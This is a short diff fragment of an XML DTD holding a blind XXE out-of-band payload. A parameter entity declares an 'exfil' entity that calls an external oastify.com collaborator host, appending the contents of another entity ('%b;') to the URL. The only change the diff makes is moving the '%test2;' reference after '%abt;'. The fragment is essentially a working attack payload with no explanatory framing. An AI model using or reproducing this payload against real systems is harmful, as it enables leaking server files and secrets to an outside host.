@@ -3,8 +3,8 @@
 
 <!ENTITY % abt "<!ENTITY %&#x25; exfil SYSTEM 'http://187hflsw0rb1sgveu111piwcl3rwfy3n.oastify.com/?x=%b;'>">
 %test1;
-%test2;
 %abt;
+%test2;
 
 
 
